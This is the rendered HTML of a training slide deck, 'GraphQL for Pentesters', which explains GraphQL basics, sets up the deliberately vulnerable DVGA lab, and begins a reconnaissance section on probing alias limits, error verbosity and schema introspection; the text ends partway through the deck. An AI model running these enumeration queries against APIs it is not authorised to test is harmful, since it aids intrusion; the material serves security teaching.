</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="2" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;--marpit-advanced-background-split:50%;" data-marpit-advanced-background="background" data-marpit-advanced-background-split="right"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;assets/GraphQL%20Logo%20+%20Wordmark%20Stacked%20(Rhodamine).svg&quot;);background-size:60%;"></figure></div></section></foreignObject><foreignObject width="50%" height="720"><section id="2" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="2" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;--marpit-advanced-background-split:50%;" data-marpit-advanced-background="content" data-marpit-advanced-background-split="right">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h2>What is GraphQL?</h2>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="2" data-marpit-pagination-total="104" style="" data-marpit-advanced-background="pseudo" data-marpit-advanced-background-split="right"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="3" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="3" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>History</h3>
<ul>
<li>developed by Facebook in 2012</li>
<li>released in 2015</li>
<li>moved to GraphQL Foundation (Linux foundation) in 2018</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="4" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="4" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Goal</h3>
<ul>
<li><img class="emoji" draggable="false" alt="✅" src="https://twemoji.maxcdn.com/v/14.0.2/svg/2705.svg" data-marp-twemoji=""/> alternative to
<ul>
<li>API schema: REST, SOAP, gRPC, etc.</li>
</ul>
</li>
<li><img class="emoji" draggable="false" alt="❌" src="https://twemoji.maxcdn.com/v/14.0.2/svg/274c.svg" data-marp-twemoji=""/> doesn't replace
<ul>
<li>graph databases (Neo4j, ArangoDB, OrientDB)</li>
<li>query lang. (SQL, NoSQL)</li>
</ul>
</li>
<li>but can be used on top of other API</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="5" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="5" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Key info</h3>
<ul>
<li>available for all major languages</li>
<li>query result is returned in JSON</li>
<li>both a query language and server-side API runtime</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="6" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="6" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Concepts</h3>
<ul>
<li>ask only for what you need</li>
<li>predictable results</li>
<li>get many resources in a single request</li>
<li>organized in terms of types and fields, not endpoints</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="7" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="7" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Concepts 2</h3>
<ul>
<li>add new fields and types to a GraphQL API without impacting existing queries</li>
<li>not limited by a specific storage engine</li>
<li>real-time ready</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="8" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="8" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Example: data description</h3>
<pre><code class="language-graphql">type Project {
  name: String
  tagline: String
  contributors: [User]
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="9" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="9" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Example: query</h3>
<pre><code class="language-graphql">{
  project(name: &quot;GraphQL&quot;) {
    tagline
  }
}
</code></pre>
<p>equiv.</p>
<pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> tagline <span class="hljs-keyword">FROM</span> project <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> &quot;GraphQL&quot;
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="10" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="10" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Example: answer</h3>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;project&quot;</span>: {
    <span class="hljs-attr">&quot;tagline&quot;</span>: <span class="hljs-string">&quot;A query language for APIs&quot;</span>
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="11" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="11" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Only what you need</h3>
<pre><code class="language-graphql">{
  hero {
    name
  }
}
</code></pre>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;hero&quot;</span>: {
      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Luke Skywalker&quot;</span>
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="12" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="12" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<pre><code class="language-graphql">{
  hero {
    name
    height
  }
}
</code></pre>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;hero&quot;</span>: {
      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Luke Skywalker&quot;</span>,
      <span class="hljs-attr">&quot;height&quot;</span>: <span class="hljs-number">1.72</span>
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="13" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="13" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>With REST:</p>
<p><code>GET /hero/0</code></p>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Luke Skywalker&quot;</span>,
  <span class="hljs-attr">&quot;height&quot;</span>: <span class="hljs-number">1.72</span>,
  <span class="hljs-attr">&quot;mass&quot;</span>: <span class="hljs-number">77</span>,
  <span class="hljs-attr">&quot;address&quot;</span>: <span class="hljs-string">&quot;Galaxy du Centaure&quot;</span>
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="14" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="14" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Many resources in a single request</h3>
<pre><code class="language-graphql">query {
  User(id: 1337) {
    name
    posts {
      title
    }
    followers(last: 3) {
      name
    }
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="15" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="15" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;data&quot;</span>: {
    <span class="hljs-attr">&quot;User&quot;</span>: {
      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;noraj&quot;</span>,
      <span class="hljs-attr">&quot;posts&quot;</span>: [
        { <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;From cookie flag to DA&quot;</span> },
        { <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;Why you shouldn&#x27;t disable IPv6&quot;</span> }
      ],
      <span class="hljs-attr">&quot;followers&quot;</span>: [
        { <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span> },
        { <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Bob&quot;</span> }
        { <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Carole&quot;</span> }
      ]
    }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="16" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="16" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>REST query n°1</p>
<p><code>GET /users/1337</code></p>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;user&quot;</span>: {
    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1337</span>,
    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;noraj&quot;</span>,
    <span class="hljs-attr">&quot;address&quot;</span>: {...},
    <span class="hljs-attr">&quot;birthday&quot;</span>: <span class="hljs-string">&quot;30/02/1979&quot;</span>

}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="17" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="17" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>

</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="18" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="18" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>

<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Install DVGA</h3>
<pre><code>$ git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git dvga &amp;&amp; cd dvga
$ docker build -t dvga .
$ docker run -t -p 5013:5013 -e WEB_HOST=0.0.0.0 --name dvga dvga
</code></pre>
<pre><code>$ cat /etc/hosts | grep .test
127.0.0.2 noraj.test
</code></pre>
<p>Verify: <code>curl http://noraj.test:5013/graphql</code></p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="23" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="23" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Now let's put in practice Escape <strong>Pentesting GraphQL 101</strong> series.</p>
<ol>
<li><a href="https://escape.tech/blog/pentest101/">Part 1 - Discovery</a></li>
<li><a href="https://escape.tech/blog/pentesting102/">Part 2 - Interaction</a></li>
<li><a href="https://escape.tech/blog/pentest103/">Part 3 - Exploitation</a></li>
</ol>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="24" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="24" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Reconnaissance / Discovery</h3>
<ul>
<li>Understanding the limits enforced</li>
<li>Determining the verbosity</li>
<li>Fetching all the information possible about the architecture</li>
</ul>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="25" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="25" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>

</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="26" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="26" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>

<pre><code class="language-graphql">query {
  __typename
}
</code></pre>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;data&quot;</span>: {
    <span class="hljs-attr">&quot;__typename&quot;</span>: <span class="hljs-string">&quot;Query&quot;</span>

}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>

</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="27" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="27" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">

</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="30" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="30" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Alias</h3>
<pre><code class="language-graphql">query {
  title1: __typename
  title2: __typename
  title3: __typename

}
</code></pre>
<p>Several queries in one query.</p>

<ul>
<li>Many alias, detect alias limit</li>

</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="33" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="33" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Detect verbosity</h3>
<pre><code class="language-graphql">query {
  noraj
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="34" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="34" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<pre><code class="language-json">{
  <span class="hljs-attr">&quot;errors&quot;</span>: [
    {
      <span class="hljs-attr">&quot;message&quot;</span>: <span class="hljs-string">&quot;Cannot query field \&quot;noraj\&quot; on type \&quot;Query\&quot;.&quot;</span>,
      <span class="hljs-attr">&quot;locations&quot;</span>: [
        {
          <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-number">2</span>,
          <span class="hljs-attr">&quot;column&quot;</span>: <span class="hljs-number">3</span>
        }
      ]
    }
  ]
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="35" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="35" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Introspection</h3>
<p>With <strong>gRPC</strong> there can be <strong>Reflection</strong> enabled that allow you to retrieve the <strong>prototype</strong> and list services.</p>
<p>Eg. with <a href="https://github.com/fullstorydev/grpcurl">grpcurl</a>:</p>
<pre><code class="language-bash"><span class="hljs-comment"># Server supports reflection</span>
grpcurl localhost:8787 list
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="36" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="36" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Introspection 2</h3>
<p>With <strong>GraphQL</strong> there is not such an easy thing to get the <strong>schema</strong> but there is something similar called <strong>introspection</strong>.</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="37" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="37" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Introspection 3</h3>
<pre><code class="language-graphql">{
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="38" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;assets/introspection_01.png&quot;);background-size:contain;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="38" data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="38" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="content"></section>

